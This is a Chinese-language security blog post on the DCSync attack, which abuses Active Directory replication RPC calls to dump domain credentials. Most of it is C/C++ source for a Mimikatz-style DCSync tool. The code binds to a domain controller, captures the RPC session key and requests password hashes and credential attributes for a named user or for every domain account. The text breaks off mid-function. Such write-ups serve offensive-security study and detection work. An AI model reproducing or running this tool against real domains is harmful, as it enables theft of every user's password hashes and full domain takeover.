---
title: DCSync - 如何滥用 IDL_DRSGetNCChanges 接口转储域数据
date: 2023-01-6 23:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Active Directory", "Domain Persistence", "DCSync"]
layout: post
---

# DCSync

DCSync 是域渗透中常用的凭据窃取手段。该技术利用域控制器同步的原理，通过 Directory Replication Service（DRS）服务的 IDL_DRSGetNCChanges 接口向域控发起数据同步请求。在 DCSync 出现之前，要想获得所有域用户的哈希，测试人员可能需要登录域控制器或通过卷影拷贝技术获取 NTDS.dit 文件。有了 DCSync 后，测试人员可以在域内任何一台机器上模拟一个域控制器，通过域数据同步复制的方式获取正在运行的合法域控制器上的数据。需要注意的是，DCSync 攻击不适用于只读域控制器（RODC）。

在默认情况下，只有 Administrators、Domain Controllers 和 Enterprise Domain Admins 组内的用户以及域控制器的机器账户才有执行 DCSync 操作的权限。从 DACL 层面说，发起攻击的主体需要在域对象中拥有以下两条 ACE：

| **CN**                         | **displayName**                    | **rightsGuid**                       |
| ------------------------------ | ---------------------------------- | ------------------------------------ |
| DS-Replication-Get-Changes     | Replicating  Directory Changes     | 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 |
| DS-Replication-Get-Changes-All | Replicating  Directory Changes All | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 |

# 基本原理

一个域环境可以拥有多台域控制器，每台域控制器各自存储着一份所在域的活动目录的可写副本，对目录的任何修改都可以从源域控制器同步到本域、域树或域林中的其它域控制器上。当一个域控想要从另一个域控获取域数据更新时，客户端域控会通过 MS-DRSR 协议中的 Drsuapi RPC 接口向服务端域控发送同步请求，该请求的响应将包含客户端域控必须应用到其活动目录副本的一组更新。

通常情况下，域控制器之间每 15 分钟就会有一次域数据同步。DCSync 攻击就是模拟了域控同步的行为去转储用户的加密凭据。

![image-20221205093717380](/assets/posts/2023-01-6-how-to-implement-a-dcsync-by-yourself/image-20221205093717380.png)

# 相关函数

DCSync 的整个攻击过程涉及到以下四个关键的 Drsuapi RPC 接口：

|           函数名            |                      函数说明                      |
| :-------------------------: | :------------------------------------------------: |
|         IDL_DRSBind         |              初始化 DRS 上下文句柄。               |
| IDL_DRSDomainControllerInfo |       检索有关给定域中域控制器（DC）的信息。       |
|      IDL_DRSCrackNames      | 在目录中查找对象，并以请求的格式将其返回给调用者。 |
|     IDL_DRSGetNCChanges     |           从服务器上的 NC 副本复制更新。           |

## IDL_DRSBind

IDL_DRSBind 函数初始化 DRS 上下文句柄，并与服务端进行消息版本和加密方式的协商，这是调用其他 Drsuapi RPC 函数之前的必要操作。

函数声明如下：

```c++
 ULONG IDL_DRSBind(
   [in] handle_t rpc_handle,
   [in, unique] UUID* puuidClientDsa,
   [in, unique] DRS_EXTENSIONS* pextClient,
   [out] DRS_EXTENSIONS** ppextServer,
   [out, ref] DRS_HANDLE* phDrs
 );
```

参数如下：

- rpc_handle [in]：一个 RPC 绑定句柄。
- puuidClientDsa [in]：指向标识调用方的 GUID 的指针。
- pextClient [in]：指向客户端功能的指针，用于消息版本协商。
- ppextServer [out]：指向服务器功能的指针，用于消息版本协商。
- phDrs [out]：指向 DRS 上下文句柄的指针，可用于调用此接口中的其他方法。

## IDL_DRSDomainControllerInfo

IDL_DRSDomainControllerInfo 函数检索有关给定域中域控制器（DC）的信息。该函数在攻击过程中用于获取域控制器的 GUID。

函数声明如下：

```c++
 ULONG IDL_DRSDomainControllerInfo(
   [in, ref] DRS_HANDLE hDrs,
   [in] DWORD dwInVersion,
   [in, ref, switch_is(dwInVersion)] 
     DRS_MSG_DCINFOREQ* pmsgIn,
   [out, ref] DWORD* pdwOutVersion,
   [out, ref, switch_is(*pdwOutVersion)] 
     DRS_MSG_DCINFOREPLY* pmsgOut
 );
```

参数如下：

- hDrs [in]：IDL_DRSBind 方法返回的 DRS 上下文句柄。
- dwInVersion [in]：请求消息的版本。
- pmsgIn [in]：指向请求消息的指针。
- pdwOutVersion [out]：指向响应消息版本的指针。
- pmsgOut [out]：指向响应消息的指针。

## IDL_DRSCrackNames

IDL_DRSCrackNames 函数在目录中查找对象，并以请求的格式将其返回给调用者。主要用来实现对象名称格式之间的转换和翻译，在攻击过程中用于获取要转储凭据的用户的 GUID。

函数声明如下：

```c++
 ULONG IDL_DRSCrackNames(
   [in, ref] DRS_HANDLE hDrs,
   [in] DWORD dwInVersion,
   [in, ref, switch_is(dwInVersion)] 
     DRS_MSG_CRACKREQ* pmsgIn,
   [out, ref] DWORD* pdwOutVersion,
   [out, ref, switch_is(*pdwOutVersion)] 
     DRS_MSG_CRACKREPLY* pmsgOut
 );
```

参数如下：

- hDrs [in]：IDL_DRSBind 方法返回的 RPC 上下文句柄。
- dwInVersion [in]：请求消息的版本。
- pmsgIn [in]：指向请求消息的指针。
- pdwOutVersion [out]：指向响应消息版本的指针。
- pmsgOut [out]：指向响应消息的指针。

## IDL_DRSGetNCChanges

IDL_DRSGetNCChanges 函数从服务器上的 NC 副本复制更新。该函数是整个攻击过程中最关键的函数，DCSync 攻击就是模拟了域控同步的行为去调用 IDL_DRSGetNCChanges 函数，并从返回的数据中解密用户凭据。

函数声明如下：

```c++
ULONG IDL_DRSGetNCChanges(
   [in, ref] DRS_HANDLE hDrs,
   [in] DWORD dwInVersion,
   [in, ref, switch_is(dwInVersion)] 
     DRS_MSG_GETCHGREQ* pmsgIn,
   [out, ref] DWORD* pdwOutVersion,
   [out, ref, switch_is(*pdwOutVersion)] 
     DRS_MSG_GETCHGREPLY* pmsgOut
 );
```

参数如下：

- hDrs [in]：IDL_DRSBind 方法返回的 RPC 上下文句柄。
- dwInVersion [in]：请求消息的版本。
- pmsgIn [in]：指向请求消息的指针。
- pdwOutVersion [out]：指向响应消息版本的指针。
- pmsgOut [out]：指向响应消息的指针。

# 编程实现

下面笔者参考 Mimikatz 的代码，通过 C/C++ 实现一个 DCSync 工具的编写。由于篇幅限制仅描述关键代码部分，相关头文件定义以及各个函数的定义位置请读者自行实现。

## 编写主函数

```c++
int wmain(int argc, wchar_t* argv[])
{
    LPCWSTR DomainName = NULL;
    LPCWSTR DomainController = NULL;
    LPCWSTR UserName = NULL;     // Target user to dump, all domain users and computer accounts by default
    LPCWSTR AuthUser = NULL;
    LPCWSTR AuthPass = NULL;
    RPC_BINDING_HANDLE hBinding;

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'd':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                DomainName = (LPCWSTR)argv[1];
                wprintf(L"[+] Got domain name: %s.\n", DomainName);
            }
            break;
        case 'u':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                AuthUser = (LPCWSTR)argv[1];
            }
            break;
        
        case 'p':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                AuthPass = (LPCWSTR)argv[1];
            }
            break;
        
        case 't':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                UserName = (LPCWSTR)argv[1];
            }
            break;
        }

        ++argv;
        --argc;
    }

    if (DomainName == NULL)
    {
        if (GetCurrentDomainName(&DomainName))
        {
            wprintf(L"[+] Got domain name: %s.\n", DomainName);
        }
        else
        {
            wprintf(L"[-] Could not get domain name.\n");
            return -1;
        }
    }

    if (DomainController == NULL)
    {
        if (GetCurrentDomainController(DomainName, &DomainController))
        {
            wprintf(L"[+] Got domain controller name: %s.\n", DomainController);
        }
        else
        {
            wprintf(L"[-] Could not get domain controller.\n");
            return -1;
        }
    }

    if (CreateRpcBinding(NULL, L"ncacn_ip_tcp", DomainController, NULL, DomainName, AuthUser, AuthPass, &hBinding, RpcSecurityCallback))
    {
        Asn1_init();
        if (Dcsync(hBinding, DomainName, DomainController, UserName))
        {
            return 1;
        }
        else
            return -1;
    }
    else
        return -1;
}
```

### 获取命令行参数

主函数首先通过循环从命令行获取以下关键参数：

- -d：指定当前所处域名，如果未指定则自动通过自定义的 GetCurrentDomainName 函数获取域名。
- -u：指定拥有 DCSync 权限的用户名，如果未指定则默认使用当前用户。
- -p：指定用户拥有 DCSync 权限的用户密码，如果未指定则默认使用当前用户凭据。
- -t：指定要转储凭据的目标用户，如果未指定则默认转储所有域用户凭据。

### 获取当前域名

如果未指定 -d 选项，则调用自定义函数 GetCurrentDomainName 获取当前域名，该函数定义如下。其通过 LsaOpenPolicy 函数打开本地本地策略对象，然后由 LsaQueryInformationPolicy 函数检索与策略对象关联的主域的域名系统（DNS）信息，从而获取域名。

```c++
BOOL GetCurrentDomainName(LPCWSTR* pDomainName)
{
	BOOL status = FALSE;
	LSA_OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
	LSA_HANDLE hPolicy;
	PPOLICY_DNS_DOMAIN_INFO pDomainInformation;

	if (NT_SUCCESS(LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
	{
		if (NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyDnsDomainInformation, (PVOID*)&pDomainInformation)))
		{
			if (pDomainInformation)
			{
				*pDomainName = pDomainInformation->DnsDomainName.Buffer;

				status = TRUE;
				LsaClose(hPolicy);
			}
		}
	}
	return status;
}
```

### 获取域控制器名称

得到域名后，自定义函数 GetCurrentDomainController 会根据域名获取域控制器名称，该函数定义如下。其通过 DsGetDcName 函数返回指定域中的域控制器的名称。

```c++
BOOL GetCurrentDomainController(LPCWSTR DomainName, LPCWSTR* pDomainConstroller)
{
	BOOL status = FALSE; 
	DWORD drsStatus;
	DWORD size;
	PDOMAIN_CONTROLLER_INFO DomainControllerInfo = NULL;
	drsStatus = DsGetDcNameW(NULL, DomainName, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &DomainControllerInfo);
	if (drsStatus == ERROR_SUCCESS)
	{
		size = (DWORD)(wcslen(DomainControllerInfo->DomainControllerName + 2) + 1) * sizeof(wchar_t);
		if (*pDomainConstroller = (wchar_t*)LocalAlloc(LPTR, size))
		{
			status = TRUE;
			RtlCopyMemory(*pDomainConstroller, DomainControllerInfo->DomainControllerName + 2, size);
		}
	}
	else wprintf(L"[-] DsGetDcNameW Error 0x%08x (%u).\n", drsStatus, drsStatus);
	return status;
}
```

### 创建 RPC 连接句柄

获取域名和域控制器名称后，会将二者传入自定义函数 CreateRpcBinding 建立 RPC 连接，并将连接句柄赋给 hBinding，该函数定义如下。

```c++
BOOL CreateRpcBinding(LPCWSTR ObjUuid, LPCWSTR ProtSeq, LPCWSTR NetworkAddr, LPCWSTR Endpoint, LPCWSTR DomainName, LPCWSTR AuthUser, LPCWSTR AuthPass, RPC_BINDING_HANDLE* hBinding, void (RPC_ENTRY* RpcSecurityCallback)(void*))
{
    LPWSTR ServerPrincName[MAX_PATH + 1];
    DWORD pcSpnLength = ARRAYSIZE(ServerPrincName);
    RPC_WSTR StringBinding = NULL;

    BOOL status = FALSE;
    RPC_STATUS rpcStatus;

    SEC_WINNT_AUTH_IDENTITY AuthIdentity = { NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE };

    *hBinding = NULL;
    rpcStatus = RpcStringBindingComposeW((RPC_WSTR)ObjUuid, (RPC_WSTR)ProtSeq, (RPC_WSTR)NetworkAddr, (RPC_WSTR)Endpoint, NULL, &StringBinding);
    if (rpcStatus == RPC_S_OK) {
        rpcStatus = RpcBindingFromStringBindingW(StringBinding, hBinding);
        if (rpcStatus == RPC_S_OK) {
            DWORD dwStatus = DsMakeSpnW(L"ldap", NetworkAddr, NULL, 0, NULL, &pcSpnLength, ServerPrincName);
            if (dwStatus == ERROR_SUCCESS)
            {
                if (AuthUser && AuthPass)
                {
                    AuthIdentity.User = (USHORT*)AuthUser;
                    AuthIdentity.UserLength = lstrlen(AuthUser);
                    AuthIdentity.Domain = (USHORT*)DomainName;
                    AuthIdentity.DomainLength = lstrlen(DomainName);
                    AuthIdentity.Password = (USHORT*)AuthPass;
                    AuthIdentity.PasswordLength = lstrlen(AuthPass);

                    rpcStatus = RpcBindingSetAuthInfoW(*hBinding, (RPC_WSTR)ServerPrincName, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_DEFAULT, &AuthIdentity, RPC_C_AUTHZ_NONE);
                }
                else
                {
                    rpcStatus = RpcBindingSetAuthInfoW(*hBinding, (RPC_WSTR)ServerPrincName, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);
                }

                if (rpcStatus == RPC_S_OK)
                {
                    if (RpcSecurityCallback)
                    {
                        rpcStatus = RpcBindingSetOption(*hBinding, RPC_C_OPT_SECURITY_CALLBACK, (ULONG_PTR)RpcSecurityCallback);
                        if (rpcStatus == RPC_S_OK)
                        {
                            status = TRUE;
                        }
                        else wprintf(L"[-] RpcBindingSetOption Error: 0x%08x (%u)\n", rpcStatus, rpcStatus);
                    }
                    else status = TRUE;
                }
                else wprintf(L"[-] RpcBindingSetAuthInfoW Error: 0x%08x (%u)\n", rpcStatus, rpcStatus);
                
            }
            else wprintf(L"[-] DsMakeSpnW Error: 0x%08x (%u)\n", dwStatus, dwStatus);
        }
        else wprintf(L"[-] RpcBindingFromStringBinding Error: 0x%08x (%u)\n", rpcStatus, rpcStatus);
    }
    else
        wprintf(L"[-] RpcStringBindingComposeW Error: 0x%08x (%u)\n", rpcStatus, rpcStatus);

    if (!status)
    {
        rpcStatus = RpcBindingFree(*hBinding);
        if (rpcStatus == RPC_S_OK)
            RpcStringFreeW(&StringBinding);
        else wprintf(L"[-] RpcBindingFree Error: 0x%08x (%u)\n", rpcStatus, rpcStatus);
    }

    RpcStringFreeW(&StringBinding);
    return status;
}
```

在该函数中将完成以下工作：

1. 通过 RpcStringBindingComposeW 和 RpcBindingFromStringBindingW 函数创建 RPC 连接的绑定句柄 hBinding。
2. 调用 DsMakeSpnW 函数构造标识 LDAP 服务实例的服务主体名称（SPN），该 SPN 用于下一步中对服务实例进行身份验证。
3. 使用 RpcBindingSetAuthInfoW 函数为 RPC 绑定句柄设置身份验证和授权信息，用于对域控上的 LDAP 服务进行身份验证。这里如果提供了 AuthUser 和 AuthPass，则将该函数的第四个参数指定为 RPC_C_AUTHN_DEFAULT，RPC 运行时库将默认使用 NTLMSSP 身份验证服务，用AuthIdentity 结构中包含的授权凭据进行客户端身份验证。否则将默认使用当前凭据。
4. 通过 RpcBindingSetOption 函数为当前 RPC 连接设置安全回调函数 RpcSecurityCallback。

回调函数 RpcSecurityCallback 用于在当前 RPC 连接的安全上下文中获取会话密钥的信息，该会话密钥用于后续解密来自域控的更新数据。该函数定义如下，其首先利用 I_RpcBindingInqSecurityContext 函数获取 RPC 连接的安全上下文，然后由 QueryContextAttributesW 函数在安全上下文中获取会话密钥。

```c++
SecPkgContext_SessionKey rpc_drsr_sKey = { 0, NULL };
void RPC_ENTRY RpcSecurityCallback(void* Context)
{
	RPC_STATUS rpcStatus;
	SECURITY_STATUS secStatus;
	PCtxtHandle data = NULL;

	rpcStatus = I_RpcBindingInqSecurityContext(Context, (LPVOID*)&data);
	if (rpcStatus == RPC_S_OK)
	{
		if (rpc_drsr_sKey.SessionKey)
		{
			FreeContextBuffer(rpc_drsr_sKey.SessionKey);
			rpc_drsr_sKey.SessionKeyLength = 0;
			rpc_drsr_sKey.SessionKey = NULL;
		}
		secStatus = QueryContextAttributesW(data, SECPKG_ATTR_SESSION_KEY, (LPVOID)&rpc_drsr_sKey);
		if (secStatus != SEC_E_OK)
			wprintf(L"[-] QueryContextAttributesW Error: %08x.\n", secStatus);
	}
	else wprintf(L"[-] I_RpcBindingInqSecurityContext Error: %08x.\n", rpcStatus);
}
```

至此，主函数通过 CreateRpcBinding 获取了到域控 LDAP 服务的 RCP 绑定句柄，并将其赋给了 hBinding。该句柄将被传入 Dcsync 函数，用于创建调用 Drsuapi RPC 接口所需的上下文句柄。

## 编写 Dcsync 功能函数

```c++
BOOL Dcsync(RPC_BINDING_HANDLE hBinding, LPCWSTR DomainName, LPCWSTR DomainController, LPCWSTR UserName)
{
    BOOL status = FALSE;
    DRS_HANDLE hDrs;
    DRS_EXTENSIONS_INT extClientInt;
    GUID DomainControllerGuid;
    
    PSID pSid;
    LPWSTR StringSid;
    LPWSTR sTempDomain;
    GUID UserGuid;

    ULONG drsStatus;
    DSNAME dsName = { 0 };
    DRS_MSG_GETCHGREQ getChgReq = { 0 };
    DWORD dwOutVersion = 0;
    DRS_MSG_GETCHGREPLY getChgReply;
    
    LPCSTR DCSYNC_OIDS_EXPORT[] = {
        szOID_ANSI_name,
        szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
        szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
        szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
        szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory,
        szOID_ANSI_supplementalCredentials, szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming,
        szOID_ANSI_trustAuthOutgoing, szOID_ANSI_currentValue, szOID_isDeleted,
    };

    if (Get_IDL_DRSBind(hBinding, &extClientInt, &hDrs))
    {
        if (Get_IDL_DRSDomainControllerInfo(hDrs, DomainController, DomainName, &DomainControllerGuid))
        {
            wprintf(L"[+] Got domain controller guid ok.\n");
        }

        if (UserName)
        {
            if (Get_IDL_DRSCrackNames(hDrs, UserName, &UserGuid))
            {
                wprintf(L"[+] Got doamin guid ok.\n");
            }
        }
        else
        {
            if (GetSidDomainFromName(DomainName, &pSid, &sTempDomain, NULL, DomainController))
            {
                if (ConvertSidToStringSidW(pSid, &StringSid))
                {
                    if (Get_IDL_DRSCrackNames(hDrs, (LPCWSTR)StringSid, &UserGuid))
                    {
                        wprintf(L"[+] Got user guid ok.\n");
                    }
                }
            }
        }

        getChgReq.V8.uuidDsaObjDest = DomainControllerGuid;
        getChgReq.V8.uuidInvocIdSrc = DomainControllerGuid;
        dsName.Guid = UserGuid;
        getChgReq.V8.pNC = &dsName;
        getChgReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
        getChgReq.V8.cMaxObjects = 1000;
        getChgReq.V8.cMaxBytes = 0x00a00000; // 10M
        getChgReq.V8.ulExtendedOp = (UserName ? EXOP_REPL_OBJ : 0);
        getChgReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * (ARRAYSIZE(DCSYNC_OIDS_EXPORT) - 1));
        getChgReq.V8.pPartialAttrSet->dwVersion = 1;
        getChgReq.V8.pPartialAttrSet->dwReserved1 = 0;
        getChgReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(DCSYNC_OIDS_EXPORT);

        for (DWORD i = 0; i < getChgReq.V8.pPartialAttrSet->cAttrs; i++)
        {
            MakeAttid(&getChgReq.V8.PrefixTableDest, DCSYNC_OIDS_EXPORT[i], &getChgReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
        }

        wprintf(L"[+] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash).\n\n");
        RpcTryExcept
        {
            do
            {
                RtlZeroMemory(&getChgReply, sizeof(DRS_MSG_GETCHGREPLY));

                drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChgReq, &dwOutVersion, &getChgReply);
                if (drsStatus == 0 && dwOutVersion == 6)
                {
                    if (Decrypt_getChgReply(&getChgReply.V6.PrefixTableSrc, getChgReply.V6.pObjects))
                    {
                        REPLENTINFLIST* pObject = getChgReply.V6.pObjects;
                        for (DWORD i = 0; i < getChgReply.V6.cNumObjects; i++)
                        {
                            DescribeUser(&getChgReply.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, DomainName);
                            pObject = pObject->pNextEntInf;
                        }
                    }
                    else
                    {
                        wprintf(L"[-] ProcessGetNCChangesReply error.\n");
                        break;
                    }
                }
                else
                {
                    wprintf(L"[-] IDL_DRSGetNCChanges error.\n");
                    break;
                }

            } while (getChgReply.V6.fMoreData);
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER);
        {
            wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
        }
        RpcEndExcept
        {
            return status;
        }
    }
    return status;
}
```

### 初始化 DRS 绑定句柄

Dcsync 函数首先定义了一个 DCSYNC_OIDS_EXPORT 数组，其中包含了要在域控获取更新的对象属性名称，为 OID 数据格式。接着调用自定义函数 Get_IDL_DRSBind，该函数定义如下。在 Get_IDL_DRSBind 内部通过 IDL_DRSBind 函数，由已创建的 RPC 绑定初始化 DRS 上下文句柄。

```c++
BOOL Get_IDL_DRSBind(RPC_BINDING_HANDLE rpc_handle, DRS_EXTENSIONS_INT* pextClientInt, DRS_HANDLE *phDrs)
{
	BOOL status = FALSE;
	ULONG drsStatus;
	GUID uuidClientDsa = { 0xe24d201a, 0x4fd6, 0x11d1, {0xa3, 0xda, 0x00, 0x00, 0xf8, 0x75, 0xae, 0x0d} };
	DRS_EXTENSIONS_INT* ppextServerInt = NULL;

	RpcTryExcept
	{
		RtlZeroMemory(pextClientInt, sizeof(DRS_EXTENSIONS_INT));
		pextClientInt->cb = sizeof(DRS_EXTENSIONS_INT) - sizeof(DWORD);
		pextClientInt->dwFlags = DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION;

		drsStatus = IDL_DRSBind(rpc_handle, &uuidClientDsa, (DRS_EXTENSIONS*)pextClientInt, (DRS_EXTENSIONS**)&ppextServerInt, phDrs);
		if (drsStatus == 0)
		{
			if (ppextServerInt)
			{
				if (ppextServerInt->cb >= FIELD_OFFSET(DRS_EXTENSIONS_INT, SiteObjGuid) - sizeof(DWORD))
				{
					if (ppextServerInt->dwFlags & (DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION))
						status = TRUE;
					else 
						wprintf(L"[-] IDL_DRSBind Error: Incorrect DRS Extensions Output (%08x).\n", ppextServerInt->dwFlags);
				}
				else 
					wprintf(L"[-] IDL_DRSBind Error: Incorrect DRS Extensions Output Size (%u).\n", ppextServerInt->cb);
			}
			else
				wprintf(L"[-] IDL_DRSBind Error: No DRS Extensions Output.\n");
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
	}
	RpcEndExcept
	{
		return status;
	}

	return status;
}

```

其中，uuidClientDsa 为指向调用方的 GUID 的指针。根据微软官方文档对 IDL_DRSBind 函数的行为描述，该 GUID 是必须的，如果将其设为 NULL 服务器将返回错误，然而可以将其设为除 NULL 以外的任何值。

pextClientInt 为指向客户端功能的指针，这是一个 DRS_EXTENSIONS_INT 结构体，用于版本协商。结构体中的 dwFlags 字段标识了调用方支持的功能列表，这里为其设置了以下两个位标志。

|          位标志           |                             说明                             |
| :-----------------------: | :----------------------------------------------------------: |
|  DRS_EXT_GETCHGREPLY_V6   | 表示 DC 支持 DRS_MSG_GETCHGREPLY_V6 版本的 IDL_DRSGetNCChanges 响应消息。 |
| DRS_EXT_STRONG_ENCRYPTION | 表示 DC 支持通过线路对密码进行额外的 128 位加密。因为DC 不得将密码复制到不支持此扩展的其他 DC。 |

### 获取域控制器的 GUID

Get_IDL_DRSBind 调用成功后，将创建的 DRS 句柄返回并赋给 Dcsync 中的 hDrs。然后将调用自定义函数 Get_IDL_DRSDomainControllerInfo，该函数定义如下。在 Get_IDL_DRSDomainControllerInfo 内部通过 IDL_DRSDomainControllerInfo 函数获取域控制器的一些信息，在这里目的是获取服务端域控的 GUID，该 GUID 是调用 IDL_DRSGetNCChanges 函数必须的参数。

```c++
BOOL Get_IDL_DRSDomainControllerInfo(DRS_HANDLE hDrs, LPCWSTR DomainControllerName, LPCWSTR DomainName, GUID *pDomainControllerGuid)
{
	BOOL status = FALSE;
	ULONG drsStatus;
	DRS_MSG_DCINFOREQ dcInfoReq = { 0 };
	DWORD dwOutVersion = 0;
	DRS_MSG_DCINFOREPLY dcInfoReply = { 0 };

	if (hDrs != NULL)
	{
		RpcTryExcept
		{
			dcInfoReq.V1.InfoLevel = 2;
			dcInfoReq.V1.Domain = (LPWSTR)DomainName;

			drsStatus = IDL_DRSDomainControllerInfo(hDrs, 1, &dcInfoReq, &dwOutVersion, &dcInfoReply);
			if (drsStatus == 0)
			{
				if (dwOutVersion == 2)
				{
					for (DWORD i = 0; i < dcInfoReply.V2.cItems; i++)
					{
						if (_wcsicmp(DomainControllerName, dcInfoReply.V2.rItems[i].DnsHostName) == 0 || _wcsicmp(DomainControllerName, dcInfoReply.V2.rItems[i].NetbiosName) == 0)
						{
							*pDomainControllerGuid = dcInfoReply.V2.rItems[i].NtdsDsaObjectGuid;
							status = TRUE;
						}
						else
							wprintf(L"[-] IDL_DRSDomainControllerInfo Error: DC \'%s\' Not Found.\n", DomainControllerName);
					}
				}
				else
					wprintf(L"[-] IDL_DRSDomainControllerInfo Error: Bad Version (%u).\n", dwOutVersion);
			}
			else
				wprintf(L"[-] IDL_DRSDomainControllerInfo Error: 0x%08x (%u).\n", drsStatus, drsStatus);
		}
		RpcExcept(EXCEPTION_EXECUTE_HANDLER);
		{
			wprintf(L"[-] Exception: %d - 0x%08x.\r\n", RpcExceptionCode(), RpcExceptionCode());
		}
		RpcEndExcept
		{
			return status;
		}
	}
	return status;
}
```

其中 dcInfoReq 是一个包含了客户端请求消息的 DRS_MSG_DCINFOREQ 结构体，这里使用的是 DRS_MSG_DCINFOREQ_V1 版本，由客户端请求信息的域名（Domain）以及客户端请求的响应版本（InfoLevel）两个属性构成，该结构声明如下。

```c++
 typedef struct {
   [string] WCHAR* Domain;
   DWORD InfoLevel;
 } DRS_MSG_DCINFOREQ_V1;
```

请求到的响应消息由 dcInfoReply 接收，这是一个 DRS_MSG_DCINFOREPLY 结构体。由于 dcInfoReq.V1.InfoLevel 将响应版本设为了 2，因此这里返回的是 DRS_MSG_DCINFOREPLY_V2 版本，该结构声明如下。

```c++
 typedef struct {
   [range(0,10000)] DWORD cItems;
   [size_is(cItems)] DS_DOMAIN_CONTROLLER_INFO_2W* rItems;
 } DRS_MSG_DCINFOREPLY_V2;
```

其中 rItems 是一个 DS_DOMAIN_CONTROLLER_INFO_2W 结构体，包含了有关域控的信息，该结构声明如下。

```c++
 typedef struct {
   [string, unique] WCHAR* NetbiosName;
   [string, unique] WCHAR* DnsHostName;
   [string, unique] WCHAR* SiteName;
   [string, unique] WCHAR* SiteObjectName;
   [string, unique] WCHAR* ComputerObjectName;
   [string, unique] WCHAR* ServerObjectName;
   [string, unique] WCHAR* NtdsDsaObjectName;
   BOOL fIsPdc;
   BOOL fDsEnabled;
   BOOL fIsGc;
   GUID SiteObjectGuid;
   GUID ComputerObjectGuid;
   GUID ServerObjectGuid;
   GUID NtdsDsaObjectGuid;
 } DS_DOMAIN_CONTROLLER_INFO_2W;
```

其中属性 NetbiosName 和 DnsHostName 分别为DC 的 NetBIOS 名称和 DNS 主机名，NtdsDsaObjectGuid 为 DC 对应的 nTDSDSA 对象的 objectGUID 属性。如果 NetbiosName 和 DnsHostName 属性的值与传入的域控制器名称相同，则从该结构中取出 NtdsDsaObjectGuid 的值作为服务端域控的 GUID。

### 获取目标用户的 GUID

Get_IDL_DRSBind 调用成功后，将继续调用自定义函数 Get_IDL_DRSCrackNames，该函数定义如下。在 Get_IDL_DRSCrackNames 内部通过 IDL_DRSCrackNames 函数查找并翻译活动目录对象的名称，在这里目的是获取要转储凭据的用户的 GUID。

在调用 Get_IDL_DRSCrackNames 之前，会先判断是否提供了 UserName 参数。如果是，就直接将提供的 UserName 传入 Get_IDL_DRSCrackNames，后续仅转储该用户的凭据；反之，则先获取并传入域 SID，后续将转储所有用户的凭据。

```c++
BOOL Get_IDL_DRSCrackNames(DRS_HANDLE hDrs, LPCWSTR UserName, GUID *pUserGuid)
{
	BOOL status = FALSE;
	ULONG drsStatus;
	DS_NAME_FORMAT rpNamesFormat;
	DRS_MSG_CRACKREQ nameCrackReq = { 0 };
	DWORD dwOutVersion = 0;
	DRS_MSG_CRACKREPLY nameCrackReply = { 0 };
	UNICODE_STRING UnicodeGuid;

	if (hDrs != NULL)
	{
		RpcTryExcept
		{
			if (wcsstr(UserName, L"S-1-5-21-") == UserName)
			{
				rpNamesFormat = DS_SID_OR_SID_HISTORY_NAME;
			}
			else if (wcschr(UserName, L'\\'))
			{
				rpNamesFormat = DS_NT4_ACCOUNT_NAME;
			}
			else if (wcschr(UserName, L'@'))
			{
				rpNamesFormat = DS_USER_PRINCIPAL_NAME;
			}
			else if (wcschr(UserName, L'='))
			{
				rpNamesFormat = DS_FQDN_1779_NAME;
			}
			else
			{
				rpNamesFormat = DS_NT4_ACCOUNT_NAME_SANS_DOMAIN;
			}

			nameCrackReq.V1.formatOffered = rpNamesFormat;
			nameCrackReq.V1.formatDesired = DS_UNIQUE_ID_NAME;
			nameCrackReq.V1.cNames = 1;
			nameCrackReq.V1.rpNames = &UserName;
			
			drsStatus = IDL_DRSCrackNames(hDrs, 1, &nameCrackReq, &dwOutVersion, &nameCrackReply);
			if (drsStatus == 0)
			{
				if (dwOutVersion == 1)
				{
					if (nameCrackReply.V1.pResult->cItems == 1)
					{
